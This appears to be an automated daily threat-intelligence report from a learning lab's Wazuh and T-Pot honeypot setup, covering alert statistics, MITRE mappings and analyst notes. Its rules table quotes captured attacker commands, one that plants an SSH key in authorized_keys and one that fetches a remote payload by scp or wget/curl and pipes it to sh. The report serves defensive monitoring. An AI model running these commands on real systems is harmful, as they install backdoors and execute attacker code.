# LearningLab01 Daily Threat Intelligence Report — 2026-10-11

Generated: 2026-10-11T13:15:05.059Z

Report window: 2026-10-10T13:15:05.035Z through 2026-10-11T13:15:05.035Z

> This report summarizes security telemetry and honeypot activity. An alert indicates that a rule matched observed activity; it does not automatically prove that a system was compromised.

## Executive Summary

| Metric | Count |
|---|---:|
| Wazuh alerts | 253,056 |
| Attack-related alerts | 17,866 |
| Honeypot interactions | 239,307 |
| Authentication failures | 4,525 |
| Authentication successes | 505 |
| Critical alerts | 185 |
| High alerts | 483 |
| T-Pot artifacts observed | 0 |
| Malicious artifact detections | 0 |

### Notable Observations

- 185 critical-severity alerts require priority review.
- 483 high-severity alerts should be reviewed after the critical queue.
- Authentication failures exceeded successful authentications by a ratio of 8.96:1.
- Country attribution currently covers only 15.82% of alerts. Country totals should be treated as partial telemetry.
- The most frequent rule was 110213: T-Pot RDP connection from [IP address] to port 3389. (138,390 alerts).

## Wazuh Security Monitoring

### Alert Severity

| Severity | Alerts | Percentage |
|---|---:|---:|
| Critical | 185 | 0.07% |
| High | 483 | 0.19% |
| Medium | 2,817 | 1.11% |
| Low | 249,571 | 98.62% |
| Informational | 0 | 0.00% |

Severity represents the priority assigned by the Wazuh rule. Critical and high alerts should be investigated first, but repeated lower-severity events can also reveal scanning, credential attacks, or attacker preparation.

### Authentication Activity

- Authentication failures: 4,525
- Authentication successes: 505
- Failure-to-success ratio: 8.96:1

A successful authentication is not considered an attack by itself. Analysts should correlate successful logins with preceding failures, source addresses, usernames, target systems, and expected activity.

### Attack-Type Breakdown

| Category | Alerts | Percentage of attack-related alerts |
|---|---:|---:|
| Network attack | 10,216 | 57.18% |
| Payload delivery | 10,216 | 57.18% |
| Authentication failure | 4,525 | 25.33% |
| Command execution | 1,835 | 10.27% |
| Reconnaissance | 790 | 4.42% |
| Network scan | 272 | 1.52% |
| Malware | 132 | 0.74% |
| SMTP attack | 87 | 0.49% |
| Web attack | 33 | 0.18% |

> Category counts may overlap because one Wazuh alert can belong to multiple rule groups. The attack-related total counts each alert once.

### Country of Origin

Wazuh supplied country information for 40,036 alerts, representing 15.82% of all alerts.

| Country | Alerts | Percentage of all alerts | Relative volume |
|---|---:|---:|---|
| Unknown | 213,020 | 84.18% | Not geolocated |
| Bulgaria | 35,643 | 14.09% | ████████████████████ |
| United Kingdom | 3,353 | 1.33% | ██ |
| Republic of Moldova | 600 | 0.24% | █ |
| Germany | 314 | 0.12% | █ |
| United States | 63 | 0.02% | █ |
| Japan | 54 | 0.02% | █ |
| Switzerland | 3 | 0.00% | █ |
| Turkey | 3 | 0.00% | █ |
| Canada | 2 | 0.00% | █ |
| Central African Republic | 1 | 0.00% | █ |

> Relative-volume bars compare only countries with known geographic attribution. Unknown alerts are excluded from the bar scale.

> Geolocation is approximate. VPNs, proxies, cloud providers, compromised hosts, carrier networks, and incomplete GeoIP coverage can make the apparent country different from the attacker’s location.

### MITRE ATT&CK Tactics

| Tactic | Alerts |
|---|---:|
| Defense Evasion | 298 |
| Initial Access | 293 |
| Persistence | 293 |
| Privilege Escalation | 293 |
| Lateral Movement | 98 |
| Credential Access | 67 |
| Impact | 30 |
| Execution | 20 |
| Command and Control | 4 |

### MITRE ATT&CK Techniques

| Technique | Alerts |
|---|---:|
| Valid Accounts | 293 |
| Remote Services | 98 |
| Brute Force | 67 |
| Stored Data Manipulation | 26 |
| Command and Scripting Interpreter | 20 |
| Data Destruction | 4 |
| File Deletion | 4 |
| Ingress Tool Transfer | 4 |
| Disable or Modify Tools | 1 |

MITRE ATT&CK describes adversary behavior rather than declaring that an attack succeeded. These mappings help analysts connect individual alerts to possible attacker objectives and investigative hypotheses.

### Most Frequent Wazuh Rules

| Rule ID | Highest Level | Alerts | Description | Agents |
|---|---:|---:|---|---|
| 110213 | 4 | 138,390 | T-Pot RDP connection from [IP address] to port 3389. | tpot (138,390) |
| 110219 | 4 | 39,555 | T-Pot CiscoASA web activity from [IP address]: "GET /+CSCOE+/logon.html?fcadbadd=1 HTTP/1.1" 200 - | tpot (39,555) |
| 110204 | 4 | 21,252 | T-Pot Honeytrap connection from [IP address] to port 5908 | tpot (21,252) |
| 110209 | 5 | 20,919 | T-Pot Conpot snmp event from [IP address]: SNMPv2 Bulk | tpot (20,919) |
| 110205 | 6 | 10,144 | T-Pot Honeytrap received a payload from [IP address] | tpot (10,144) |
| 110207 | 5 | 7,204 | T-Pot SentryPeer SIP activity from [IP address]:60619, method INVITE | tpot (7,204) |
| 110101 | 3 | 6,208 | Cowrie SSH connection from [IP address]. | tpot (6,208) |
| 110102 | 5 | 4,525 | Cowrie failed login from [IP address] using username root. | tpot (4,525) |
| 110104 | 7 | 1,626 | Cowrie captured a command from [IP address]: za | tpot (1,626) |
| 110201 | 4 | 602 | T-Pot Dionaea pptpd connection from [IP address] to port 1723 | tpot (602) |
| 110214 | 9 | 271 | T-Pot RDP honeypot detected a connection burst from [IP address]. | tpot (271) |
| 110222 | 9 | 245 | T-Pot CiscoASA detected repeated web requests from one source. | tpot (245) |
| 533 | 7 | 240 | Listened ports status (netstat) changed (new port opened or closed). | tpot (240) |
| 110216 | 4 | 217 | T-Pot Mailoney received SMTP command from [IP address]: EHLO User  | tpot (217) |
| 110103 | 10 | 212 | Cowrie accepted login from [IP address] using username lghkel	. | tpot (212) |
| 5501 | 3 | 195 | PAM: Login session opened. | tpot (193), wazuh (2) |
| 110109 | 13 | 185 | Cowrie captured a destructive, persistence, or defense-evasion command from [IP address]: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ | tpot (185) |
| 5502 | 3 | 170 | PAM: Login session closed. | tpot (169), wazuh (1) |
| 110221 | 7 | 156 | T-Pot CiscoASA detected configuration discovery from [IP address]: "GET /appGet.cgi?hook=get_cfg_clientlist() HTTP/1.1" 404 - | tpot (156) |
| 110105 | 12 | 108 | Cowrie captured a file download from [IP address]. | tpot (108) |
| 5715 | 3 | 98 | sshd: authentication success. | tpot (97), wazuh (1) |
| 110217 | 7 | 87 | T-Pot Mailoney captured suspicious SMTP activity from [IP address]: AUTH LOGIN  | tpot (87) |
| 110220 | 8 | 80 | T-Pot CiscoASA captured a login request from [IP address]: "POST /login.cgi HTTP/1.1" 200 - | tpot (80) |
| 110212 | 10 | 72 | T-Pot Honeytrap detected repeated payload activity from [IP address]. | tpot (72) |
| 110106 | 10 | 67 | Cowrie detected repeated failed logins from [IP address]. | tpot (67) |
| 110215 | 4 | 47 | T-Pot MiniPrint event: connection, action open_conn, Connection opened | tpot (47) |
| 510 | 7 | 41 | Host-based anomaly detection event (rootcheck). | wazuh (40), tpot (1) |
| 110223 | 5 | 32 | T-Pot HoneyAML received  request from  to  on port . | tpot (32) |
| 110208 | 7 | 30 | T-Pot SentryPeer detected SIP scanner friendly-scanner from [IP address]:5065 | tpot (30) |
| 110108 | 12 | 20 | Cowrie captured suspicious execution or staging activity from $(src_ip): $(input) | tpot (20) |
| 550 | 7 | 15 | Integrity checksum changed. | tpot (15) |
| 592 | 8 | 11 | Log file size reduced. | tpot (11) |
| 110107 | 12 | 4 | Cowrie captured a probable payload-retrieval command from [IP address]: uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp \|\| cd /var/tmp \|\| cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.ppk; echo 'StrictHostKeyChecking no; UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -s -F sshcfg -i key.ppk dlr@[IP address]:sh out_sh; if [ $? -eq 0 ]; then chmod +x out_sh; sh out_sh ssh >/dev/null 2>&1; else (wget --no-check-certificate -qO- https://[IP address]/sh \|\| curl -sk https://[IP address]/sh) \| sh -s ssh; fi; rm -rf sshcfg key.ppk out_sh | tpot (4) |
| 553 | 7 | 4 | File deleted. | tpot (4) |
| 554 | 5 | 4 | File added to the system. | tpot (4) |
| 86003 | 3 | 3 | Docker: Error message | tpot (3) |
| 110218 | 9 | 2 | T-Pot Mailoney detected repeated SMTP activity from one source. | tpot (2) |
| 19004 | 7 | 2 | SCA summary: CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Score less than 50% (47) | tpot (2) |
| 19010 | 3 | 2 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure all AppArmor Profiles are in enforce or complain mode.: Status changed from failed to passed | tpot (2) |
| 19011 | 9 | 2 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure all AppArmor Profiles are in enforce or complain mode.: Status changed from passed to failed | tpot (2) |
| 203 | 9 | 2 | Agent event queue is full. Events may be lost. | tpot (2) |
| 110211 | 9 | 1 | T-Pot Dionaea detected a connection burst from [IP address]. | tpot (1) |
| 110224 | 7 | 1 | T-Pot HoneyAML received an HTTP POST from [IP address] to /mcp. | tpot (1) |
| 202 | 7 | 1 | Agent event queue is 90% full. | tpot (1) |
| 205 | 3 | 1 | Agent event queue is back to normal load. | tpot (1) |
| 503 | 3 | 1 | Wazuh agent started. | tpot (1) |
| 506 | 3 | 1 | Wazuh agent stopped. | tpot (1) |
| 591 | 3 | 1 | Log file rotated. | tpot (1) |

### New or Previously Unseen Detections

Historical novelty comparison is not enabled in the exporter yet. This section will compare the current report window with the preceding 30-day baseline. Until that comparison is enabled, no rule should be described as new solely because it appears in this report.

### SOC Analyst Learning Notes

1. Begin with critical and high alerts, but validate the underlying event.
2. Determine whether the event represents scanning, attempted access, payload delivery, execution, persistence, or impact.
3. Correlate source IP, username, target, timestamp, and related alerts.
4. Check whether a successful login followed repeated failures.
5. Separate honeypot interaction from activity against production assets.
6. Document evidence supporting both malicious and benign explanations.
7. Escalate based on confirmed risk, affected assets, and confidence—not alert volume alone.

## T-Pot Artifact Intelligence

### Artifact Summary

- Artifacts observed: 0
- Known hashes: 0
- Uploaded or analyzed: 0
- Malicious detections: 0
- Suspicious detections: 0
- Lookup errors: 0

### Artifacts

| SHA-256 | Bytes | Status | Malicious | Suspicious | Undetected | VirusTotal |
|---|---:|---|---:|---:|---:|---|
| No artifacts observed | — | — | — | — | — | — |

## Security Onion Network Monitoring

_Planned integration._

This section will eventually contain Suricata alerts, Zeek observations, network attack types, source-country information, targeted services, new network behaviors, and correlations with Wazuh endpoint alerts.

## Report Limitations

- Alert counts represent rule matches, not necessarily unique attackers.
- Attack-category counts may overlap.
- Honeypot traffic is intentionally exposed and is not equivalent to a compromise of a production system.
- GeoIP attribution is approximate and currently has incomplete coverage.
- VirusTotal results can change as vendors update their detections.

Generated automatically by the LearningLab01 threat-intelligence pipeline.
